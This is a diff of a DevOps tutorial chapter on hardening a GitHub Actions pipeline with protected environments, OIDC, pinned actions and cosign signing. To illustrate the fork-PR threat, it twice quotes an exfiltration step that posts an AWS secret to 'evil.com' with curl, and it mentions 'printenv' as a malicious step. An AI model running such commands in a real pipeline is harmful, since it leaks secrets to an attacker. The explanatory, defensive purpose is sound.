@@ -65,8 +65,9 @@ The chapter also names the **two pipeline-shaped security failures** Part
   single `echo "$AWS_SECRET" > /tmp/x; curl evil.com -d @/tmp/x` step
   exfiltrates every secret the workflow can see. The workflows in
   [`examples/bookstore-platform/ci/`](../examples/bookstore-platform/ci/)
-  structurally prevent it; this chapter shows how (path filters, the
-  `if: github.event_name == 'push'` guard, the
+  prevent it with an environment, a narrow token and no
+  `pull_request_target`; this chapter shows how (path filters, the
+  `if: github.event_name == 'push'` convenience, the
   `pull_request_target` *non*-pattern).
 
 - **Mutable action versions** — a workflow that uses `@v3` runs whatever that
@@ -136,26 +137,33 @@ scope, branch-environment mapping, and fail-fast.**
   developers to ignore it.
 
 - **Branch-environment mapping is a *config*, not a workflow change.**
-  `main` → `dev` overlay (auto-merge). A `release/*` branch or tag →
-  `staging` overlay. A tag on `release/*` → `prod` overlay (with
-  reviewers). Part 15 ch.04 shows the ApplicationSet that makes the
+  `main` → `dev` overlay (auto-merge). Staging and prod do not get a build
+  of their own: a promotion PR moves the digest that `main` built into the
+  next overlay ([15.04](04-multi-environment-promotion.md)). Part 15 ch.04 shows the ApplicationSet that makes the
   env-overlay mapping declarative; this
   chapter wires the `main` → `dev` path so the rest is a configuration
   change.
 
-- **The "CI ate my repo" footgun is structurally prevented, not just
-  warned about.** Three layers of defence:
-  1. The `if: github.event_name == 'push' && github.ref == 'refs/heads/main'`
-     guard on the build-sign-push and update-gitops-pr jobs. Fork PRs
-     run `lint-test`, `integration-test`, `scan` — **never** sign,
-     **never** push, **never** open a GitOps PR.
-  2. `permissions:` is `contents: read` at workflow level, and no job widens
-     it for anything it does not need. A fork PR's `GITHUB_TOKEN` is read-only
-     regardless.
-  3. No `pull_request_target` triggers anywhere. (`pull_request_target`
-     runs in the context of the base branch and has access to secrets —
-     the single most common foot-gun. Use it only with extreme caution,
-     never for build/test/push.)
+- **The "CI ate my repo" footgun is blocked by an environment, not by an
+  `if:`.** Four layers of defence, strongest first:
+  1. The `bookstore-publish` environment on the build-sign-push and
+     update-gitops-pr jobs. It holds the AWS role ARN and the GitOps token,
+     requires a reviewer, and allows deployments from `main` only. A job that
+     names an environment gets that environment's secrets and an OIDC `sub`
+     claim that contains the environment name. A workflow on another branch
+     fails before its first step, even if its copy of the workflow file was
+     edited.
+  2. Fork PRs get no secrets and a read-only `GITHUB_TOKEN`, from GitHub
+     itself ([security hardening guide](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)).
+  3. The `if: github.event_name == 'push' && github.ref == 'refs/heads/main'`
+     guard on those jobs. It is a convenience. On a `pull_request` run the
+     workflow file is the merge commit's copy, so a PR can edit the `if:`
+     itself. It keeps fork PRs out in practice; the environment is what
+     stops same-repository branches.
+  4. `permissions:` is `contents: read` at workflow level, and no job widens
+     it for anything it does not need. No `pull_request_target` trigger
+     appears anywhere: it runs in the base branch's context with secrets, and
+     the chapter's workflows do not use it for build, test or push.
 
 The trap to keep in view: a CI that *gets it 90% right* is a CI that
 ships an unsigned image or one wrong AWS-key environment, and the
@@ -171,7 +179,7 @@ operations around them.
 
 | Threat | Control taught here | Goes deeper |
 |---|---|---|
-| A fork PR runs untrusted code next to your secrets | Fork PRs get no secrets and a read-only token. Signing, push and the GitOps PR run only on a push to `main`. No `pull_request_target` | [07.03](../07-delivery/03-cicd-pipeline.md) |
+| A fork PR runs untrusted code next to your secrets | Fork PRs get no secrets and a read-only token ([GitHub's hardening guide](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)). Signing, push and the GitOps PR run only on a push to `main`. No `pull_request_target` | [07.03](../07-delivery/03-cicd-pipeline.md) |
 | A long-lived cloud key sits in the repo | OIDC: the job trades a short-lived token for role credentials | [14.07](../14-eks-in-production-a-to-z/07-infrastructure-cicd-and-drift.md) |
 | A token can write more than its job needs | `contents: read` at workflow level. Each job asks for more in its own `permissions:`. The GitOps PAT covers one repo | [07.03](../07-delivery/03-cicd-pipeline.md) |
 | A tag on a third-party action moves to malicious code | Every third-party action pinned to a commit SHA, with the release in a comment | [05.03](../05-security/03-supply-chain.md), [07.03](../07-delivery/03-cicd-pipeline.md) |
@@ -192,8 +200,8 @@ flowchart TD
     lt["lint-test<br/>actions/setup-go<br/>golangci-lint-action (golangci-lint v2.15.0)<br/>go test -short -race -coverpkg=./..."]
     it["integration-test<br/>Postgres contract test<br/>(testcontainers, no service container)<br/>go test -race -run TestPostgresRepo_Contract"]
     sc{"scan<br/>trivy-action (Trivy v0.76.1)<br/>exit-code 1, HIGH+CRITICAL"}
-    bsp["build-sign-push<br/>docker/build-push-action (amd64+arm64)<br/>configure-aws-credentials (OIDC)<br/>amazon-ecr-login<br/>cosign-installer (cosign v3.1.4)<br/>cosign sign --recursive + attest<br/>download-syft (syft v1.55.0)"]
-    gp["update-gitops-pr<br/>checkout (GITOPS_REPO, no persisted token)<br/>kustomize v5.8.1 edit set image NAME@DIGEST<br/>create-pull-request (GITOPS_PR_TOKEN)"]
+    bsp["build-sign-push  [environment: bookstore-publish]<br/>docker/build-push-action (amd64+arm64)<br/>configure-aws-credentials (OIDC)<br/>amazon-ecr-login<br/>cosign-installer (cosign v3.1.4)<br/>cosign sign --recursive + CycloneDX attest<br/>attest-build-provenance (SLSA)<br/>download-syft (syft v1.55.0)"]
+    gp["update-gitops-pr  [environment: bookstore-publish]<br/>checkout (GITOPS_REPO, no persisted token)<br/>kustomize v5.8.1 edit set image, images/ Component only<br/>size guard: one file, at most 8 changed lines<br/>create-pull-request (GITOPS_PR_TOKEN)"]
     fail["FAIL the pipeline<br/>(stops BEFORE sign/push)"]
     git[("GitOps repo PR<br/>kustomize/overlays/dev<br/>(new digest)")]
     argo["Argo CD<br/>(Part 07 ch.04 — pulls)"]
@@ -213,19 +221,19 @@ flowchart TD
  pull_request -> main     any feature/* branch              (none -    PR review
                                                             no push)   (1+ approver)
  push (merged PR)         refs/heads/main                   dev        auto-merge
- push (release branch)    refs/heads/release/X.Y           staging    1 reviewer
-                          *Part 15 ch.04
- tag                      refs/tags/vX.Y.Z                  prod       2 reviewers
-                          *Part 15 ch.04                          + on-call
+ promotion PR (GitOps)    no rebuild: the same digest      staging    1 reviewer
+                          moves to the next overlay        prod       2 reviewers
+                          *Part 15 ch.04                                + on-call
  ───────────────────────────────────────────────────────────────────────────────
- The workflow's `if:` conditions enforce this:
+ The workflow's `if:` (a convenience) and its environment (the boundary):
    build-sign-push:     if: github.event_name == 'push' && github.ref == 'refs/heads/main'
-   (staging/prod variants set ref to release/* or refs/tags/v* — Part 15 ch.04)
+                        environment: bookstore-publish   (main only, one reviewer)
 
- The "if push to main" guard is THE security boundary for fork PRs:
+ Fork PRs and same-repository branches, and what each can reach:
    - fork PR -> ONLY lint-test + integration-test + scan run
-   - fork PR -> NO secrets accessible (GitHub omits secrets for fork PRs by default)
-   - fork PR -> NO push to ECR, NO cosign sign, NO GitOps PR
+   - fork PR -> NO secrets (GitHub omits them) and a read-only token
+   - same-repository branch -> it can edit the workflow file, but the
+     environment's branch rule refuses the publish job unless the run is on main
    - merged PR (on main) -> the FULL pipeline runs (push + sign + PR)
 ```
 
@@ -255,7 +263,7 @@ golangci-lint run --timeout=5m ./...
 go test -short -race -count=1 -coverpkg=./... -coverprofile=coverage.out ./...
 go tool cover -func=coverage.out | tail -1        # the same number CI prints
 
-# Stage 2 mirror — the Postgres contract test. testcontainers starts its own
+# Stage 2 mirror: the Postgres contract test. testcontainers starts its own
 # Postgres, so Docker must be running on this machine:
 go test -race -count=1 -timeout=5m -run TestPostgresRepo_Contract ./...
 
@@ -266,11 +274,12 @@ trivy fs --severity HIGH,CRITICAL --exit-code 1 --ignore-unfixed examples/bookst
 ```
 
 This is stages 1–3 verbatim. Stage 4 (build-sign-push) and stage 5
-(update-gitops-pr) need ECR + OIDC + the GitOps repo PAT; the
-[`sbom-and-sign.sh`](../examples/bookstore-platform/ci/sbom-and-sign.sh)
-helper covers the cosign keyless half (with the honest caveat that a
-laptop-driven cosign produces a *different OIDC subject* than the
-workflow's — ch.15.03's territory).
+(update-gitops-pr) need ECR, OIDC and the GitOps repo token, so they run only
+in CI. The [`sbom-and-sign.sh`](../examples/bookstore-platform/ci/sbom-and-sign.sh)
+helper in the examples signs with the operator's own login, which is a
+different identity from the workflow's ([15.03](03-image-signing-and-provenance.md)).
+This chapter does not run it. Read it to see the steps, and verify with the
+Quick Reference instead.
 
 ### 1. The workflow, job by job
 
@@ -317,9 +326,10 @@ credentials yet.**
 
 **Job 4 — `build-sign-push`** (`runs-on: ubuntu-latest`, `needs: scan`,
 `if: github.event_name == 'push' && github.ref == 'refs/heads/main'`).
-**This is the first job that needs cloud credentials, and the
-`if:` guard is the security boundary.** A fork PR never reaches this
-job. On a merged-to-`main` push:
+**This is the first job that needs cloud credentials. It runs in the
+`bookstore-publish` environment, which is the boundary; the `if:` is a
+convenience** (the footgun section below explains why). A fork PR never
+reaches this job. On a merged-to-`main` push:
 
 1. `aws-actions/configure-aws-credentials` with `role-to-assume:
    ${{ secrets.AWS_ROLE_ARN_ECR }}` and `audience: sts.amazonaws.com` —
@@ -327,8 +337,8 @@ job. On a merged-to-`main` push:
    on this job), STS exchanges it for role credentials that expire with the
    role session (one hour by default, see How it works). **No long-lived AWS
    key is ever stored in the repo.**
-2. `aws-actions/amazon-ecr-login@v2` logs Docker into ECR with those
-   credentials.
+2. `aws-actions/amazon-ecr-login`, pinned by SHA (v2.1.7), logs Docker into
+   ECR with those credentials.
 3. `docker/setup-qemu-action` + `docker/setup-buildx-action` set
    up multi-arch builds. QEMU emulates arm64 on the amd64 runner — slow
    but reliable; for high-throughput builds, use a self-hosted arm64
@@ -343,11 +353,10 @@ job. On a merged-to-`main` push:
 5. `docker/build-push-action` builds the multi-stage Dockerfile,
    pushes the multi-arch manifest to ECR, tagged `sha-<COMMIT>` AND
    `latest-main`. The action exposes the manifest digest as
-   `steps.build.outputs.digest`. `provenance: true` + `sbom: true`
-   attach SLSA provenance + an SBOM to the manifest list directly (the
-   buildx-native form); the explicit cosign attest below is the
-   Sigstore-native form. Both formats coexist; different consumers
-   prefer different shapes.
+   `steps.build.outputs.digest`. `provenance: false` and
+   `sbom: false` turn off BuildKit's own attestations. They are unsigned, so
+   the chapter keeps one signed form for each: the CycloneDX SBOM in steps 7
+   and 9, and the SLSA provenance in step 10.
 6. **Trivy again** — this time against the *pushed digest*
    (`image-ref: ...@${{ steps.build.outputs.digest }}`). This catches
    CVEs in the base image (distroless still has packages — `glibc`,
@@ -355,8 +364,8 @@ job. On a merged-to-`main` push:
    refreshed). Same `--exit-code 1` gate. The two scans complement: the
    filesystem scan catches Go-module CVEs, the image scan catches
    base-layer CVEs.
-7. `syft <IMAGE>@<DIGEST> -o spdx-json` — full SBOM as SPDX JSON, bound
-   to the digest.
+7. `syft <IMAGE>@<DIGEST> -o cyclonedx-json` writes a CycloneDX SBOM for the
+   digest.
 8. `cosign sign --yes --recursive <IMAGE>@<DIGEST>`: **keyless**.
    `--recursive` signs each platform image in the index, not only the index
    (cosign's own help text). [15.03](03-image-signing-and-provenance.md)
@@ -367,17 +376,23 @@ job. On a merged-to-`main` push:
    — a Kyverno `verifyImages` rule can match exactly that). The cert +
    signature + a Rekor entry are stored; **no long-lived signing key is
    stored**.
-9. `cosign attest --type spdxjson --predicate <SBOM> <IMAGE>@<DIGEST>` —
+9. `cosign attest --type cyclonedx --predicate <SBOM> <IMAGE>@<DIGEST>` —
    the SBOM is bound to the digest as a cosign attestation, so a
    consumer can `cosign verify-attestation` and trust the SBOM via the
    signature chain.
-10. The digest is written to `digest.txt` and uploaded as an artifact
+10. `actions/attest-build-provenance`, pinned by SHA (the pin 07.03 uses, v4.2.2),
+    writes a SLSA provenance statement for the digest to GitHub's attestation
+    store, signed with the workflow identity. [15.03](03-image-signing-and-provenance.md)
+    verifies it with `gh attestation verify`. The job needs `attestations:
+    write` and `id-token: write`.
+11. The digest is written to `digest.txt` and uploaded as an artifact
     `digest-catalog`. Per-leg fan-in (Part 07 ch.03's matrix-fan-in
     note): a matrix-job's `outputs:` collapses to the last-finishing
     leg, so artifact-per-leg is the correct pattern.
 
 **Job 5 — `update-gitops-pr`** (`runs-on: ubuntu-latest`,
-`needs: build-sign-push`, same `if:` guard). The CI/CD seam.
+`needs: build-sign-push`, the same `if:` and the same `bookstore-publish`
+environment, because the GitOps token lives there). The CI/CD seam.
 
 1. `actions/checkout` with `repository: ${{ vars.GITOPS_REPO }}` —
    checks out the **GitOps repo**, not the app repo. `token:
@@ -398,14 +413,21 @@ job. On a merged-to-`main` push:
    `bookstore/catalog@` with no digest = unsearchable, unfetchable, and
    `kubectl apply` would only fail at admission, after Argo CD synced
    it).
-5. `cd gitops/kustomize/overlays/dev && kustomize edit set image
-   bookstore/catalog=<REGISTRY>/bookstore/catalog@<DIGEST>`.
+5. Edit only the dev pins, in `gitops/kustomize/overlays/dev/images/`, a
+   Kustomize Component that holds nothing but the `images:` list.
+   `kustomize edit` rewrites the whole file it touches, so the job checks the
+   result: only that one file may change, at most eight lines may change, and
+   `kustomize build` of the dev overlay must render the new reference. A larger
+   diff fails the job. This is the layout 15.04 uses for prod, and the layout
+   the release workflow in this repository uses.
 6. `peter-evans/create-pull-request` (v7.0.11) opens a PR on a branch
    `bump/catalog-<SHA>`. The PR body includes the source workflow run
    ID and the commit SHA, so a reviewer can trace back to the cosign
    identity. The PR is opened with a PAT or App token, not `GITHUB_TOKEN`: a
    PR that `GITHUB_TOKEN` opens starts no checks, so the required checks never
-   run ([07.03](../07-delivery/03-cicd-pipeline.md) shows it). **No auto-merge
+   run ([07.03](../07-delivery/03-cicd-pipeline.md) shows it, and GitHub's
+   [token documentation](https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication)
+   gives the rule). **No auto-merge
    enabled here** — that is a branch-protection
    *rule* in the GitOps repo, not a workflow choice. The dev overlay PR
    may auto-merge if branch protection allows; staging/prod overlay PRs
@@ -426,7 +448,7 @@ files differ from catalog only in the test profile, calibrated to risk:
 | --- | --- | --- | --- |
 | Test profile | unit + Postgres IT | + RabbitMQ IT | + RabbitMQ IT + provider stub |
 | Coverage gate | none | 70%, main only | 80%, every event |
-| Race detector | unit only | unit only | unit + IT (concurrent consumer) |
+| Race detector | unit + IT | unit + IT | unit + IT (concurrent consumer) |
 | Integration timeout | 5m | 8m | 10m |
 
 The rationale: catalog is read-only (a bug = a refresh), orders writes to
@@ -450,11 +472,12 @@ runs
 with this set, **minus** any secrets (GitHub omits secrets for fork PRs
 by default). The `if: github.event_name == 'push' && github.ref ==
 'refs/heads/main'` guard on `build-sign-push` and `update-gitops-pr`
-means: even if a malicious PR added a step like `run: cat
-$GITHUB_ENV; printenv`, the job carrying secrets *would not run* (the
-`if:` is evaluated before any step in the job). The two together —
-narrow workflow permissions + `if: github.event_name == 'push'` on
-secret-needing jobs — are the structural defence. The two anti-patterns
+means: a PR that adds a step like `run: printenv` could reach the job's
+secrets *if the PR's copy of the workflow is the one that runs*, and on a
+`pull_request` run it is. So the `if:` alone is not a boundary. The boundary
+is the `bookstore-publish` environment: its required reviewer and main-only
+deployment rule stop the job before any step runs, whatever the file says.
+Narrow workflow permissions and the environment are the structural defence. The two anti-patterns
 to **never** use:
 
 ```yaml
@@ -483,10 +506,26 @@ makes the safe pattern *enforceable at admission* via Kyverno
   trust relationship configured *once* in AWS (Part 14 ch.07's territory):
   an IAM OIDC identity provider points at
   `token.actions.githubusercontent.com`, and an IAM role
-  (`github-actions-ecr-catalog`) has a trust policy that says "any GitHub
-  Actions JWT whose `sub` claim matches
-  `repo:GITHUB_ORG/bookstore:ref:refs/heads/main` and whose audience is
-  `sts.amazonaws.com` may assume me". When the workflow runs:
+  (`github-actions-ecr-catalog`) has a trust policy that admits a GitHub
+  Actions JWT only when the `sub` claim names the environment, the `ref` is
+  `main` and the audience is STS:
+
+  ```json
+  "Condition": {
+    "StringEquals": {
+      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
+      "token.actions.githubusercontent.com:sub": "repo:GITHUB_ORG/bookstore:environment:bookstore-publish",
+      "token.actions.githubusercontent.com:ref": "refs/heads/main"
+    }
+  }
+  ```
+
+  A job that names an environment gets a `sub` with the environment in it
+  and no branch, so a trust policy that still matches
+  `repo:GITHUB_ORG/bookstore:ref:refs/heads/main` never matches the publish
+  job. The `ref` condition and the environment's deployment rule are two
+  checks on the branch. The [GitHub OIDC reference](https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect)
+  lists the claims. When the workflow runs:
   1. GitHub mints a short-lived JWT signed by their key (the
      `id-token: write` permission unlocks this).
   2. The action exchanges the JWT at STS for role credentials.
@@ -547,12 +586,12 @@ makes the safe pattern *enforceable at admission* via Kyverno
   pattern:
     - dev overlay PRs: auto-merge enabled, no required reviewers.
     - staging overlay PRs: one required reviewer (the team owning the
-      service); status check `argo-cd-staging-synced` must pass.
+      service).
     - prod overlay PRs: two required reviewers (the team + a platform
-      engineer); status checks `argo-cd-staging-synced` AND
-      `argo-cd-staging-healthy-24h` must pass.
-  Part 15 ch.04 shows the per-overlay workflow variants that emit the
-  staging/prod PRs.
+      engineer).
+  This workflow opens only the dev PR. Staging and prod are promotion PRs
+  that move the same digest with no rebuild ([15.04](04-multi-environment-promotion.md)).
+  Nothing automated checks the staging soak yet; 15.04 explains the gap.
 
 - **The path filter is a runner-minutes optimisation, not a security
   boundary.** `paths: ['app/catalog/**']` makes the catalog workflow
@@ -574,10 +613,10 @@ makes the safe pattern *enforceable at admission* via Kyverno
   CVE-2026-33634). A SHA names the code that runs, so the code that runs is
   the code you reviewed. Dependabot can propose SHA bumps as reviewable pull
   requests, with the release named in the comment.
-- **Scope secrets to environments.** Give a publish job `environment:` (for
-  staging or production) with required reviewers, and keep its role ARN and
-  other credentials in that environment, so a development workflow never
-  sees them. The Terraform apply workflow in
+- **Scope secrets to environments.** The publish jobs here use the
+  `bookstore-publish` environment, with a required reviewer, a deployment
+  rule that allows `main` only, and the role ARN and the GitOps token inside
+  it, so a development workflow never sees them. The Terraform apply workflow in
   [14.07](../14-eks-in-production-a-to-z/07-infrastructure-cicd-and-drift.md)
   uses the same pattern.
 - **Run publish jobs on runners you control, when the risk warrants it.**
@@ -629,9 +668,10 @@ gh -R GITHUB_ORG/bookstore run view  WORKFLOW_RUN_ID --log
 gh -R GITHUB_ORG/bookstore-gitops pr list --search 'bump:'
 gh -R GITHUB_ORG/bookstore-gitops pr view  PR_NUM
 
-# Local cosign keyless dry-run (ad hoc). Name the identity you expect:
-CERT_IDENTITY=YOUR_OIDC_IDENTITY CERT_OIDC_ISSUER=ISSUER_URL \
-  ./examples/bookstore-platform/ci/sbom-and-sign.sh catalog \
+# Verify a published signature. Never sign from a laptop (15.03). Name the identity you expect:
+cosign verify \
+  --certificate-identity 'https://github.com/GITHUB_ORG/bookstore/.github/workflows/catalog.yml@refs/heads/main' \
+  --certificate-oidc-issuer https://token.actions.githubusercontent.com \
   'AWS_ACCOUNT_ID.dkr.ecr.AWS_REGION.amazonaws.com/bookstore/catalog@sha256:DIGEST-HEX'
 ```
 
@@ -671,7 +711,8 @@ jobs:
     runs-on: ubuntu-latest
     needs: scan
     if: github.event_name == 'push' && github.ref == 'refs/heads/main'
-    permissions: { contents: read, id-token: write }
+    environment: bookstore-publish         # reviewer, main only, holds the role ARN
+    permissions: { contents: read, id-token: write, attestations: write }
     steps:
       - uses: aws-actions/configure-aws-credentials@7474bc4690e29a8392af63c5b98e7449536d5c3a # v4.3.1
       - uses: docker/build-push-action@10e90e3645eae34f1e60eeb005ba3a3d33f178e8 # v6.19.2
@@ -679,6 +720,7 @@ jobs:
   update-gitops-pr:                        # stage 5: PR to the GitOps repo, not kubectl apply
     needs: build-sign-push
     if: github.event_name == 'push' && github.ref == 'refs/heads/main'
+    environment: bookstore-publish         # holds the GitOps token
     permissions: { contents: read }
     steps:
       - uses: peter-evans/create-pull-request@22a9089034f40e5a961c8808d113e2c98fb63676 # v7.0.11
@@ -691,17 +733,18 @@ Checklist:
       build-sign-push → update-gitops-pr; fail-fast at each gate
 - [ ] **OIDC** for ECR push (no static AWS keys in repo secrets);
       `id-token: write` on the build job only
-- [ ] `if: github.event_name == 'push' && github.ref ==
-      'refs/heads/main'` on the secret-needing jobs (the "CI ate my
-      repo" structural defence)
+- [ ] The `bookstore-publish` environment on the secret-needing jobs: a
+      required reviewer, deployments from `main` only, and the secrets inside
+      it (the `if:` stays as a convenience)
 - [ ] No `pull_request_target` triggers anywhere; `contents: read` at
       workflow level, and each job's extra scope in its own `permissions:`
 - [ ] Every third-party action pinned to a commit SHA, with the release
       in a comment; Trivy and cosign pinned by version
 - [ ] Multi-arch buildx (amd64 + arm64) so Part 14 ch.09 Graviton
       migration is a config bump, not a code change
-- [ ] cosign keyless sign with `--recursive`, and cosign attest SBOM bound
-      to the **digest** (not a tag); per-leg digest artifact for the fan-in
+- [ ] cosign keyless sign with `--recursive`, and cosign attest a CycloneDX
+      SBOM bound to the **digest** (not a tag), plus SLSA provenance from
+      `actions/attest-build-provenance`; per-leg digest artifact for the fan-in
       into the GitOps PR job
 - [ ] GitOps PR opened with a PAT or App token scoped to the GitOps repo;
       branch protection there: dev auto-merges; staging and prod need review
@@ -722,9 +765,10 @@ Checklist:
    An untrusted PR (from a fork or external contributor) runs a workflow that
    has access to secrets — a single `echo $AWS_SECRET > /tmp/x; curl evil.com
    -d @/tmp/x` step exfiltrates everything the workflow can see. Three
-   defences: (1) `if: github.event_name == 'push' && github.ref ==
-   'refs/heads/main'` guard on the privileged jobs (sign, push, GitOps PR) —
-   fork PRs run lint/test/scan only; (2) workflow-level `permissions:` minimal
+   defences: (1) the `bookstore-publish` environment on the privileged jobs
+   (sign, push, GitOps PR), with a reviewer and main-only deployments, so their
+   secrets are not released to other branches (the `if:` is only a
+   convenience); fork PRs run lint/test/scan only; (2) workflow-level `permissions:` minimal
    (`id-token: write` only when needed, default `contents: read`); (3)
    **don't** use `pull_request_target` against fork code unless the workflow
    is hardened — that trigger runs in the base repo's context with secrets,
